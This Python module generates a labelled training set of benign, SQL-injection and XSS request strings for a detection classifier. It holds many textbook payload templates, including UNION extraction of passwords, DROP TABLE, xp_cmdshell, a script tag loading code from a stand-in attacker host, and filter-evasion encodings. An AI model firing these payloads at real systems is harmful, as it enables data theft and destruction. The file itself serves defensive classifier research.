"""Synthetic dataset generator for benign, SQL-injection and XSS request strings.

SAFETY NOTE
-----------
Every sample produced here is an *inert Python string*. Nothing in this module
(or anywhere else in the project) sends a payload to a server, renders it in a
browser, passes it to a database driver, or evaluates it. The payloads are
textbook test strings of the kind published in OWASP testing guides; they are
used purely as text for training a classifier. JavaScript calls are restricted
to harmless markers (alert/prompt/confirm/console.log/print) and hostnames use
the reserved `.example` / `.test` TLDs (RFC 2606).

Design
------
Each record is built in three steps, applied identically to every class so
that no step leaks the label on its own:

1. **Base string** - drawn from a class-specific *family* of templates
   (e.g. SQLi "union", XSS "event_handler", benign "tech_question").
2. **Obfuscation** - malicious strings receive one evasion transform
   (URL encoding, case mixing, comment whitespace, ...). Benign strings receive
   the encodings a real form submission can legitimately carry (URL encoding,
   HTML entities), so `%` or `&#` alone is never a giveaway.
3. **Context** - with fixed probabilities the value is wrapped as
   `param=value` or `param=value&k=v`, mimicking query strings.

Benign data deliberately contains a "hard" subset (`hard_benign=True`):
strings that mention SQL keywords, HTML tags, quotes, `=` and other
characters that naive signatures flag. These estimate false-positive risk.

Run `python -m src.data_generation` to (re)write `data/payloads.csv`.
"""
from __future__ import annotations

import random
import string
from typing import Callable

import pandas as pd

from . import config

# =========================================================================== #
# Shared vocabularies
# =========================================================================== #
FIRST_NAMES = ["James", "Mary", "Somchai", "Priya", "Liam", "Olivia", "Wei",
               "Fatima", "Carlos", "Anna", "Kenji", "Aisha", "Lucas", "Mia",
               "Noah", "Sofia", "Ahmed", "Chloe", "Mateo", "Hana", "Pim",
               "Ethan", "Zoe", "Arjun", "Nina", "Tom", "Ivan", "Elena"]
LAST_NAMES = ["Smith", "O'Brien", "Garcia", "Nguyen", "D'Angelo", "Kim",
              "Muller", "Rossi", "Silva", "Tanaka", "O'Neil", "Patel",
              "Johnson", "Lopez", "Chen", "Dubois", "Kowalski", "Haddad",
              "Van der Berg", "McDonald", "Srisuk", "Anderson", "Okafor"]
NOUNS = ["laptop", "shoes", "coffee", "flight", "hotel", "book", "camera",
         "phone", "jacket", "ticket", "guitar", "bike", "printer", "monitor",
         "watch", "backpack", "headphones", "tent", "keyboard", "lamp", "desk",
         "chair", "router", "mattress", "blender", "sofa", "charger", "lens"]
ADJECTIVES = ["cheap", "best", "used", "new", "wireless", "red", "small",
              "portable", "vintage", "organic", "waterproof", "lightweight",
              "discount", "premium", "refurbished", "large", "quiet", "fast"]
PLACES = ["bangkok", "chiang mai", "london", "new york", "tokyo", "paris",
          "berlin", "sydney", "toronto", "lisbon", "union station",
          "times square", "central park", "seoul", "madrid", "oslo"]
TOPICS = ["python", "excel", "mysql", "postgres", "react", "css", "html",
          "javascript", "linux", "docker", "git", "java", "pandas", "regex"]
WORDS = ("the a an and or but with from to for of in on at by about select "
         "update order group table union drop insert delete join where like "
         "having script alert style image source load error click focus "
         "great good bad price quality delivery fast slow love hate thanks "
         "please help question answer issue problem works broken").split()
TLDS = ["com", "org", "net", "io", "co.th", "de", "example"]
PARAMS = ["id", "q", "search", "user", "name", "page", "cat", "comment",
          "redirect", "email", "item", "sort", "lang", "ref", "msg", "query"]


def _pick(rng: random.Random, seq):
    return seq[rng.randrange(len(seq))]


# =========================================================================== #
# Benign generators  (each returns (text, family, hard_benign_flag))
# =========================================================================== #
def _benign_search(rng):
    parts = [_pick(rng, ADJECTIVES), _pick(rng, NOUNS)]
    if rng.random() < 0.5:
        parts.append(_pick(rng, ["near", "in", "to", "from", "under"]))
        parts.append(_pick(rng, PLACES + [f"${rng.randint(5, 900)}"]))
    if rng.random() < 0.3:
        parts.append(str(rng.randint(2015, 2026)))
    return " ".join(parts), "search", False


def _benign_name(rng):
    fmt = rng.randrange(4)
    f, l = _pick(rng, FIRST_NAMES), _pick(rng, LAST_NAMES)
    text = [f"{f} {l}", f"{l}, {f}", f"{f[0]}. {l}", f"{f} {l} Jr."][fmt]
    return text, "name", "'" in text


def _benign_email(rng):
    f, l = _pick(rng, FIRST_NAMES).lower(), _pick(rng, LAST_NAMES).lower()
    l = l.replace("'", "").replace(" ", "")
    sep = _pick(rng, [".", "_", "", "-", "+news"])
    return f"{f}{sep}{l}{rng.randint(0, 99)}@mail.{_pick(rng, TLDS)}", "email", False


def _benign_number(rng):
    kind = rng.randrange(6)
    if kind == 0:
        return str(rng.randint(1, 99999)), "number", False
    if kind == 1:
        return f"{rng.randint(1, 9999)}.{rng.randint(0, 99):02d}", "number", False
    if kind == 2:
        return f"+66 {rng.randint(80, 99)} {rng.randint(100, 999)} {rng.randint(1000, 9999)}", "phone", False
    if kind == 3:
        return f"{rng.randint(2000, 2026)}-{rng.randint(1, 12):02d}-{rng.randint(1, 28):02d}", "date", False
    if kind == 4:
        return f"{rng.randint(1, 12)}/{rng.randint(1, 28)}/{rng.randint(1990, 2026)}", "date", False
    return f"SKU-{rng.randint(1000, 9999)}-{_pick(rng, string.ascii_uppercase)}{rng.randint(10, 99)}", "product_id", False


def _benign_sentence(rng):
    starts = ["I love this", "Great", "Not bad,", "Terrible", "Fast delivery",
              "Would buy again", "Thanks for the help", "Does it come in",
              "Can't believe the", "It's the best", "My kid's favourite",
              "Don't order the", "Five stars for the", "Meh -"]
    ends = ["!", "!!", ".", "...", " :)", " :-(", " <3", " ;)", " 10/10", "?",
            " - would recommend.", " (size M)", " & fast shipping"]
    text = f"{_pick(rng, starts)} {_pick(rng, ADJECTIVES)} {_pick(rng, NOUNS)}{_pick(rng, ends)}"
    hard = any(c in text for c in "'<&;")
    return text, "review", hard


def _benign_free_text(rng):
    n = rng.randint(4, 14)
    text = " ".join(_pick(rng, WORDS) for _ in range(n)).capitalize()
    text += _pick(rng, [".", "?", "!", "", " - thanks", " :)"])
    return text, "free_text", True   # contains SQL/HTML words in prose


def _benign_tech_question(rng):
    # Developers legitimately type SQL and HTML fragments into search boxes.
    templates = [
        "how to use union select in {t}",
        "select * from users where id = 5 {t} tutorial",
        "what does the <script> tag do in html",
        "difference between onclick and addEventListener",
        "{t}: order by two columns desc",
        "drop table if exists syntax {t}",
        "why does 1=1 appear in sql examples",
        "insert into orders values example",
        "how to escape ' in {t} strings",
        "<div> vs <span> which to use",
        "javascript alert() not working in {t}",
        "group by having count(*) > 1",
        "use <br> or <p> for line breaks?",
        "{t} where name like '%smith%'",
        "img onerror fallback image best practice",
        "sql comment syntax -- vs /* */",
        "sleep() function in {t}",
        "document.getElementById returns null",
        "char(10) newline in {t}",
        "update table set column = null where id in (1,2,3)",
        "what is information_schema in {t}",
        "x = y ? 1 : 0 ternary in {t}",
        "a < b && b > c evaluates to",
        "convert int to string {t}",
    ]
    text = _pick(rng, templates).format(t=_pick(rng, TOPICS))
    return text, "tech_question", True


def _benign_url(rng):
    host = f"{_pick(rng, ['www', 'shop', 'blog', 'docs', 'api'])}.{_pick(rng, NOUNS)}{_pick(rng, ['', 'hub', 'store', 'world'])}.{_pick(rng, TLDS)}"
    path = "/".join(_pick(rng, NOUNS) for _ in range(rng.randint(0, 3)))
    url = f"https://{host}/{path}"
    if rng.random() < 0.5:
        url += f"?{_pick(rng, PARAMS)}={rng.randint(1, 500)}&utm_source={_pick(rng, ['mail', 'ads', 'feed'])}"
    return url, "url", False


def _benign_json(rng):
    k1, k2 = _pick(rng, PARAMS), _pick(rng, PARAMS)
    v = _pick(rng, [str(rng.randint(0, 999)), f'"{_pick(rng, NOUNS)}"', "true", "null",
                    f'["{_pick(rng, NOUNS)}","{_pick(rng, NOUNS)}"]'])
    return f'{{"{k1}": {v}, "{k2}": "{_pick(rng, ADJECTIVES)}"}}', "json", True


def _benign_password(rng):
    # Users pick passwords full of symbols; they are a classic FP source.
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{};:,.?<>'\""
    n = rng.randint(8, 20)
    return "".join(_pick(rng, alphabet) for _ in range(n)), "password", True


def _benign_token(rng):
    kind = rng.randrange(4)
    if kind == 0:
        return "-".join("".join(_pick(rng, "0123456789abcdef") for _ in range(k)) for k in (8, 4, 4, 4, 12)), "uuid", False
    if kind == 1:
        alphabet = string.ascii_letters + string.digits
        body = "".join(_pick(rng, alphabet) for _ in range(rng.randint(16, 40)))
        return body + _pick(rng, ["", "=", "=="]), "base64", False
    if kind == 2:
        return "#" + "".join(_pick(rng, "0123456789abcdef") for _ in range(6)), "color", False
    return f"/home/{_pick(rng, FIRST_NAMES).lower()}/{_pick(rng, NOUNS)}_{rng.randint(1, 99)}.{_pick(rng, ['pdf', 'jpg', 'csv', 'docx'])}", "path", False


def _benign_math(rng):
    a, b = rng.randint(0, 99), rng.randint(0, 99)
    templates = [f"{a}+{b}={a + b}", f"{a} < {b}", f"x >= {a} and y <= {b}",
                 f"({a} + {b}) * 2", f"{a}% off", f"{a}-{b}", f"price < {a * 10} & rating > 4",
                 f"{a}/{b}", f"{a}={a}"]
    return _pick(rng, templates), "math", True


def _benign_address(rng):
    text = (f"{rng.randint(1, 999)} {_pick(rng, ['Main', 'Oak', 'Sukhumvit', 'King', 'Park', 'Baker'])} "
            f"{_pick(rng, ['St', 'Rd', 'Ave', 'Soi 11', 'Blvd'])}, Apt #{rng.randint(1, 50)}, "
            f"{_pick(rng, PLACES).title()} {rng.randint(10000, 99999)}")
    return text, "address", False


def _benign_unicode(rng):
    samples = ["café au lait", "naïve résumé", "สวัสดีครับ", "ข้าวผัดกุ้ง", "東京 ホテル",
               "München Straße", "señor García", "Zoë's crème brûlée", "привет мир",
               "北京 烤鸭", "jalapeño poppers", "São Paulo", "Ærø ferry"]
    return f"{_pick(rng, samples)} {rng.randint(1, 20)}", "unicode", False


BENIGN_GENERATORS: list[tuple[Callable, float]] = [
    (_benign_search, 0.16), (_benign_name, 0.07), (_benign_email, 0.06),
    (_benign_number, 0.09), (_benign_sentence, 0.11), (_benign_free_text, 0.08),
    (_benign_tech_question, 0.08), (_benign_url, 0.07), (_benign_json, 0.04),
    (_benign_password, 0.05), (_benign_token, 0.06), (_benign_math, 0.04),
    (_benign_address, 0.05), (_benign_unicode, 0.04),
]

# =========================================================================== #
# SQL-injection templates (grouped by attack family)
# Placeholders: {q} quote/prefix, {c} comment terminator, {n}/{m} integers,
#               {tbl} table, {col} column, {cols} column list
# =========================================================================== #
SQLI_TEMPLATES = {
    "tautology": [
        "{q} OR {n}={n}{c}", "{q} OR '{w}'='{w}", "{q}) OR ({n}={n}{c}",
        "{q} OR 1 LIKE 1{c}", "{q} || {n}={n}{c}", "{q} OR true{c}",
        "\" or \"\"=\"", "{q} OR {n}>{m}{c}", "admin'{c}", "{q} OR 'x'<>'y'{c}",
        "{q} OR {n} IS NOT NULL{c}", "1' OR '1'='1' /*",
    ],
    "union": [
        "{q} UNION SELECT {cols}{c}", "-{n} UNION ALL SELECT {cols} FROM {tbl}{c}",
        "{q} UNION SELECT NULL,@@version,NULL{c}",
        "{q} UNION SELECT table_name,NULL FROM information_schema.tables{c}",
        "{q} UNION SELECT username,password FROM {tbl}{c}",
        "{q} UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}'{c}",
        "{n} UNION SELECT {cols} INTO OUTFILE '/tmp/out.txt'{c}",
        "{q} UNION SELECT group_concat({col}) FROM {tbl}{c}",
    ],
    "error_based": [
        "{q} AND extractvalue(1,concat(0x7e,version())){c}",
        "{q} AND updatexml(1,concat(0x7e,(SELECT user())),1){c}",
        "{q} AND 1=CONVERT(int,(SELECT @@version)){c}",
        "{q} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}",
        "{q} AND 1=CAST((SELECT {col} FROM {tbl} LIMIT 1) AS int){c}",
        "{q} AND exp(~(SELECT * FROM (SELECT user())x)){c}",
    ],
    "stacked": [
        "{q}; DROP TABLE {tbl}{c}", "{n}; INSERT INTO {tbl} VALUES ({n},'x','y'){c}",
        "{q}; UPDATE {tbl} SET role='admin' WHERE id={n}{c}",
        "{q}; EXEC xp_cmdshell('dir'){c}", "{q}; DELETE FROM {tbl}{c}",
        "{q}; SHUTDOWN{c}", "{q}; TRUNCATE TABLE {tbl}{c}",
    ],
    "time_blind": [
        "{q} AND SLEEP({n}){c}", "{q}; WAITFOR DELAY '0:0:{n}'{c}",
        "{q} AND pg_sleep({n}){c}", "{n} AND BENCHMARK({m}000000,MD5(1)){c}",
        "{q} OR IF(1=1,SLEEP({n}),0){c}", "{q} AND (SELECT {n} FROM (SELECT(SLEEP({n})))a){c}",
        "{q} || pg_sleep({n}){c}",
    ],
    "boolean_blind": [
        "{q} AND {n}={n}{c}", "{q} AND {n}={m}{c}",
        "{q} AND SUBSTRING((SELECT password FROM {tbl} LIMIT 1),1,1)='a'{c}",
        "{q} AND ASCII(SUBSTR(database(),{n},1))>{m}{c}",
        "{q} AND (SELECT COUNT(*) FROM {tbl})>0{c}",
        "{q} AND LENGTH(user())>{n}{c}", "{q} AND EXISTS(SELECT * FROM {tbl}){c}",
    ],
    "order_by": [
        "{q} ORDER BY {n}{c}", "{n} GROUP BY {cols} HAVING 1=1{c}", "{q} ORDER BY {n} DESC{c}",
    ],
}
SQL_PREFIXES = ["'", "\"", "", "')", "\")", "1'", "1", "admin'", "{word}'", "{num}'", "'))", "{num}"]
SQL_COMMENTS = ["--", "-- -", "#", "/*", ";--", "", "", "-- x"]
SQL_TABLES = ["users", "accounts", "members", "admin", "customers", "orders", "login", "employees"]
SQL_COLUMNS = ["username", "password", "email", "pass", "user_id", "credit_card", "name"]

# =========================================================================== #
# XSS templates.  {f} is a harmless marker call, {h} an example host.
# =========================================================================== #
XSS_TEMPLATES = {
    "script_tag": [
        "<script>{f}</script>", "<script src=//{h}/x.js></script>",
        "<script type=\"text/javascript\">{f}</script>", "<script>{f};</script>",
        "<scr<script>ipt>{f}</scr</script>ipt>", "<script>window.onload=function(){{{f}}}</script>",
    ],
    "event_handler": [
        "<img src=x onerror={f}>", "<body onload={f}>", "<svg onload={f}>",
        "<div onmouseover=\"{f}\">hover me</div>", "<input autofocus onfocus={f}>",
        "<details open ontoggle={f}>", "<video><source onerror=\"{f}\"></video>",
        "<iframe onload={f}></iframe>", "<marquee onstart={f}>", "<select onchange={f}><option>1</select>",
        "<a onmouseover=\"{f}\" href=\"#\">link</a>", "<audio src=x onerror={f}>",
    ],
    "js_uri": [
        "<a href=\"javascript:{f}\">click</a>", "<iframe src=\"javascript:{f}\"></iframe>",
        "javascript:{f}", "<form action=\"javascript:{f}\"><input type=submit>",
        "<object data=\"javascript:{f}\">", "<embed src=\"javascript:{f}\">",
    ],
    "attr_breakout": [
        "\"><script>{f}</script>", "' onmouseover='{f}", "\"><img src=x onerror={f}>",
        "</title><script>{f}</script>", "</textarea><svg onload={f}>",
        "\" autofocus onfocus=\"{f}", "'><svg/onload={f}>", "</script><script>{f}</script>",
    ],
    "data_uri": [
        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
        "<object data=\"data:text/html,<script>{f}</script>\"></object>",
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
        "<embed src=\"data:image/svg+xml,<svg onload={f}>\">",
    ],
    "template_dom": [
        "{{{{constructor.constructor('{f}')()}}}}", "#<img src=x onerror={f}>",
        "${{{f}}}", "<img src=x:x onerror=eval(location.hash.slice(1))>",
        "{{{{$on.constructor('{f}')()}}}}",
    ],
    "style_based": [
        "<div style=\"background:url(javascript:{f})\">", "<style>@import'javascript:{f}';</style>",
        "<div style=\"width:expression({f})\">", "<link rel=stylesheet href=\"javascript:{f}\">",
    ],
}
XSS_CALLS = ["alert(1)", "alert({n})", "prompt(1)", "confirm(1)", "alert(document.cookie)",
             "alert(document.domain)", "console.log({n})", "print()", "alert('XSS')",
             "alert(String(1))"]
XSS_HOSTS = ["evil.example", "attacker.test", "cdn.example", "x.test"]


# =========================================================================== #
# Encoding helpers (pure string transforms - nothing is decoded/executed)
# =========================================================================== #
_SAFE = set(string.ascii_letters + string.digits + "-_.~")


def url_encode(s: str, rng: random.Random, full: bool = False) -> str:
    """Percent-encode non-alphanumeric characters (spaces as %20 or +)."""
    out = []
    for ch in s:
        if ch in _SAFE and not full:
            out.append(ch)
        elif ch == " " and rng.random() < 0.5:
            out.append("+")
        else:
            out.extend(f"%{b:02X}" for b in ch.encode("utf-8"))
    return "".join(out)


def html_entity(s: str, rng: random.Random, ratio: float = 0.6) -> str:
    """Replace a fraction of characters with decimal or hex HTML entities."""
    out = []
    for ch in s:
        if (not ch.isalnum() or rng.random() < 0.3) and rng.random() < ratio:
            out.append(f"&#{ord(ch)};" if rng.random() < 0.5 else f"&#x{ord(ch):x};")
        else:
            out.append(ch)
    return "".join(out)


def random_case(s: str, rng: random.Random) -> str:
    return "".join(ch.upper() if rng.random() < 0.5 else ch.lower() for ch in s)


SQL_KEYWORDS = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
                "INSERT", "INTO", "UPDATE", "DELETE", "DROP", "TABLE", "SLEEP",
                "GROUP", "HAVING", "LIMIT", "EXEC", "ALL", "NULL", "VALUES"]


# =========================================================================== #
# Obfuscation transforms per class
# =========================================================================== #
def _sqli_obfuscate(s: str, kind: str, rng: random.Random) -> str:
    if kind == "none":
        return s
    if kind == "case":
        return random_case(s, rng)
    if kind == "comment_ws":                       # spaces -> inline comments
        return s.replace(" ", _pick(rng, ["/**/", "/*x*/", "/*--*/"]))
    if kind == "url_encode":
        return url_encode(s, rng)
    if kind == "html_entity":                      # rare for SQLi; fall back
        return html_entity(s, rng, ratio=0.4)
    if kind == "tag_slash":                        # n/a for SQLi -> tabs
        return s.replace(" ", "\t")
    if kind == "double_url":
        return url_encode(url_encode(s, rng), rng)
    if kind == "whitespace_alt":
        return "".join(_pick(rng, ["%09", "%0a", "%0d", "%0c", "%a0"]) if ch == " " else ch for ch in s)
    if kind == "versioned_comment":                # MySQL /*!50000KEYWORD*/
        for kw in SQL_KEYWORDS:
            s = s.replace(f" {kw} ", f" /*!{_pick(rng, ['', '50000', '40100'])}{kw}*/ ")
        return s
    if kind == "char_encoding":                    # string literals -> CHAR()/0x
        out = s
        for lit in ["'a'", "'admin'", "'x'", "'y'", "'dir'", "'0:0:"]:
            if lit in out:
                inner = lit.strip("'")
                enc = (f"CHAR({','.join(str(ord(c)) for c in inner)})" if rng.random() < 0.5
                       else "0x" + inner.encode().hex())
                out = out.replace(lit, enc)
        if out == s:                                # no literal: encode a keyword with CHAR concat
            out = s.replace("SELECT", "SEL'+'ECT").replace("UNION", "UN'+'ION").replace("OR ", "||") \
                if rng.random() < 0.5 else s + " AND 0x61=0x61"
        return out
    if kind == "unicode_escape":                   # JSON-body style ' quotes
        return "".join(f"\\u{ord(ch):04x}" if ch in "'\"=();" or (ch.isalpha() and rng.random() < 0.15)
                       else ch for ch in s)
    if kind == "benign_padding":
        return _pad_with_benign(s, rng)
    raise ValueError(kind)


def _xss_obfuscate(s: str, kind: str, rng: random.Random) -> str:
    if kind == "none":
        return s
    if kind == "case":
        return random_case(s, rng)
    if kind == "comment_ws":                       # HTML/JS comment noise
        return s.replace("<script>", "<script>/**/").replace(" ", _pick(rng, [" ", "\n", "\t"]))
    if kind == "url_encode":
        return url_encode(s, rng)
    if kind == "html_entity":
        return html_entity(s, rng)
    if kind == "tag_slash":                        # <img/src=x/onerror=...>
        return s.replace(" ", "/")
    if kind == "double_url":
        return url_encode(url_encode(s, rng), rng)
    if kind == "whitespace_alt":
        return "".join(_pick(rng, ["%09", "%0a", "%0d", "%0c"]) if ch == " " else ch for ch in s)
    if kind == "versioned_comment":                # n/a for XSS -> JS comment splitting
        return s.replace("(", "/**/(").replace("javascript:", "java\tscript:")
    if kind == "unicode_escape":                   # JS \uXXXX escapes
        out = []
        for ch in s:
            if (ch in "<>()'\"" or (ch.isalpha() and rng.random() < 0.35)) and rng.random() < 0.8:
                out.append(f"\\u{ord(ch):04x}")
            else:
                out.append(ch)
        return "".join(out)
    if kind == "char_encoding":                    # alert(1) -> eval(String.fromCharCode(...))
        for call in XSS_CALLS_EXPANDED:
            if call in s:
                codes = ",".join(str(ord(c)) for c in call)
                return s.replace(call, f"eval(String.fromCharCode({codes}))")
        return s.replace("<", "\\x3c").replace(">", "\\x3e")
    if kind == "benign_padding":
        return _pad_with_benign(s, rng)
    raise ValueError(kind)


def _pad_with_benign(s: str, rng: random.Random) -> str:
    """Mimicry attack: bury the payload inside long, innocuous prose."""
    def prose():
        return " ".join(_benign_sentence(rng)[0] for _ in range(rng.randint(2, 5)))
    return f"{prose()} {s} {prose()}"


# Concrete call strings, filled lazily (depends on {n}); used by char_encoding.
XSS_CALLS_EXPANDED: list[str] = []


# =========================================================================== #
# Payload builders
# =========================================================================== #
def _fill_sqli(template: str, rng: random.Random) -> str:
    n = rng.randint(1, 20)
    q = _pick(rng, SQL_PREFIXES).format(word=_pick(rng, NOUNS), num=rng.randint(1, 999))
    return template.format(
        q=q, c=_pick(rng, SQL_COMMENTS), n=n, m=rng.randint(1, 120),
        w=_pick(rng, ["a", "1", "x", "abc"]), tbl=_pick(rng, SQL_TABLES),
        col=_pick(rng, SQL_COLUMNS),
        cols=",".join(_pick(rng, ["NULL", "1", "2", "3", "username", "password", "@@version", "user()"])
                      for _ in range(rng.randint(1, 5))),
    ).strip()


def _fill_xss(template: str, rng: random.Random) -> str:
    call = _pick(rng, XSS_CALLS).format(n=rng.randint(1, 999))
    if call not in XSS_CALLS_EXPANDED:
        XSS_CALLS_EXPANDED.append(call)
    return template.format(f=call, h=_pick(rng, XSS_HOSTS))


def _choose_obfuscation(rng: random.Random) -> str:
    """40% plain; the rest spread over seen (~6% each) and held-out (~4% each)."""
    r = rng.random()
    if r < 0.40:
        return "none"
    seen = [o for o in config.SEEN_OBFUSCATIONS if o != "none"]
    pool = seen * 3 + config.HELD_OUT_OBFUSCATIONS * 2          # weights 3:2
    return _pick(rng, pool)


def _wrap_context(value: str, rng: random.Random) -> tuple[str, str]:
    """Wrap a value as a query-string parameter with class-independent odds."""
    r = rng.random()
    if r < 0.65:
        return value, "raw"
    p = _pick(rng, PARAMS)
    if r < 0.90:
        return f"{p}={value}", "param"
    other = f"{_pick(rng, PARAMS)}={_pick(rng, [str(rng.randint(1, 50)), _pick(rng, NOUNS), 'en', 'asc'])}"
    return (f"{p}={value}&{other}" if rng.random() < 0.5 else f"{other}&{p}={value}"), "multi_param"


def _maybe_prefix(s: str, rng: random.Random, p: float = 0.12) -> str:
    """Attackers often append the payload to a plausible value."""
    if rng.random() < p:
        return f"{_pick(rng, [_pick(rng, NOUNS), str(rng.randint(1, 999)), _pick(rng, FIRST_NAMES)])}{s}"
    return s


# =========================================================================== #
# Main entry point
# =========================================================================== #
def generate_dataset(seed: int = config.SEED,
                     n_benign: int = config.N_BENIGN,
                     n_sqli: int = config.N_SQLI,
                     n_xss: int = config.N_XSS) -> pd.DataFrame:
    """Return a de-duplicated, shuffled DataFrame of labelled request strings.

    Columns: text, label, family, obfuscation, context, hard_benign.
    """
    rng = random.Random(seed)
    XSS_CALLS_EXPANDED.clear()
    rows: list[dict] = []
    seen: set[str] = set()

    def add(text, label, family, obf, ctx, hard):
        if text in seen or not text.strip():
            return False
        seen.add(text)
        rows.append(dict(text=text, label=label, family=family, obfuscation=obf,
                         context=ctx, hard_benign=hard))
        return True

    # ---- benign ---------------------------------------------------------- #
    gens, weights = zip(*BENIGN_GENERATORS)
    count, attempts = 0, 0
    while count < n_benign and attempts < n_benign * 50:
        attempts += 1
        text, family, hard = rng.choices(gens, weights=weights)[0](rng)
        r = rng.random()
        obf = "none"
        if r < 0.15:                                 # browser form encoding
            text, obf = url_encode(text, rng), "url_encode"
        elif r < 0.18:                               # entities in rich-text fields
            text, obf = html_entity(text, rng, ratio=0.5), "html_entity"
        text, ctx = _wrap_context(text, rng)
        count += add(text, "benign", family, obf, ctx, hard)

    # ---- malicious ------------------------------------------------------- #
    for label, n_target, templates, filler, obfuscate in [
        ("sqli", n_sqli, SQLI_TEMPLATES, _fill_sqli, _sqli_obfuscate),
        ("xss", n_xss, XSS_TEMPLATES, _fill_xss, _xss_obfuscate),
    ]:
        families = sorted(templates)
        count, attempts = 0, 0
        while count < n_target and attempts < n_target * 50:
            attempts += 1
            family = _pick(rng, families)
            payload = filler(_pick(rng, templates[family]), rng)
            payload = _maybe_prefix(payload, rng)
            obf = _choose_obfuscation(rng)
            payload = obfuscate(payload, obf, rng)
            payload, ctx = _wrap_context(payload, rng)
            count += add(payload, label, family, obf, ctx, False)

    df = pd.DataFrame(rows)
    df = df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
    df.insert(0, "id", range(len(df)))
    return df


def main() -> None:
    config.DATA_DIR.mkdir(parents=True, exist_ok=True)
    df = generate_dataset()
    df.to_csv(config.DATASET_CSV, index=False)
    print(f"wrote {len(df):,} rows -> {config.DATASET_CSV.relative_to(config.ROOT)}")
    print(df.groupby(["label"]).size().to_string())


if __name__ == "__main__":
    main()
